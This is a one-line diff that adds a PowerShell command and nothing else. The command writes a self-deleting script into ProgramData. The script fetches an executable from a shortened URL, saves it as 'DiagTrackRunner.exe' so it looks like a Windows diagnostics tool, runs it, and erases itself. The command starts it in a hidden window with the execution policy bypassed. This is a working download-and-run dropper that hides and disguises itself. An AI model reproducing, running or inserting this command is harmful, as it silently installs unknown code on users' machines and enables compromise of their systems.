@@ -1,0 +1,1 @@
+cd $env:ProgramData; Set-Content lover.ps1 'Invoke-WebRequest -Uri ''https://tinyurl.com/2fk8b2yk'' -OutFile ''DiagTrackRunner.exe''; Start-Process -FilePath ''.\DiagTrackRunner.exe''; Start-Sleep -Seconds 2; Remove-Item `$MyInvocation.MyCommand.Path -Force'; Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File .\lover.ps1'
